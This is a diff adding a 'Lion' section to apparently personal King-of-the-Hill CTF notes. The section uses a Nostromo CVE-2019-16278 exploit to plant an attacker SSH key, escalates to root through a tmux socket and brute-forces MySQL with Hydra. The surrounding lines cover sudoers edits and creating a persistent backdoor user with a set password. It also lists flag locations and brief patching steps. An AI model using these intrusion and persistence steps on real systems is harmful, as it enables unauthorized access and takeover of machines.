@@ -118,7 +118,42 @@ Replace pico in sudoers file with ALL. (e.g. fortuna    ALL=(ALL:ALL) ALL)
 you're root  
 stuff to do:   
 	change password to fortuna.  
-	Remove fortuna from /etc/sudoers and add another user that you have credentials for.  
+	Remove fortuna from /etc/sudoers and add another user that you have credentials for. 
+	
+## Lion:
+Requires: cve2019-16278.py(file in github), Hydra
+
+```ssh-keygen```
+When generating the key, leave the passphrase empty.  This can be done beforehand.
+`cat <Your Key Name>.pub` (e.g. cat keygen.pub)
+```python2 cve2019-16278.py <KOTH IP> 8080 "mkdir /home/gloria/.ssh; echo '<YOUR *.pub file data>' > /home/gloria/.ssh/authorized_keys"```
+Replace <YOUR \*.pub file data> with what you got from the cat.
+```
+ssh -i sshkey gloria@<KOTH IP> -p 1337
+/usr/bin/tmux -S /.dev/session
+```
+You are Now ROOT
+
+Flag Locations
+```
+/home/gloria/user.txt	 
+/home/marty/user.txt	Reversed
+/home/alex/user.txt	Rot13
+/root/.flag	 
+/opt/code/server.py	 
+MySQL: db-> blog, table-> users, id-> 140	 
+```
+Brute force MYSQL Password with Hydra
+```
+hydra -l root -P /usr/share/wordlists/rockyou.txt <MACHINE_IP> mysql
+```
+
+PATCHING
+1. Kill Nostromo, and replace with new server.
+2. Apply LFI Patch on port 5555.
+3. Patch insecure file upload.
+4. Change password, do the usual things.
+
 
 # afterwards stuff:  
 sudo useradd technoblade(i typically use password neverdie)  
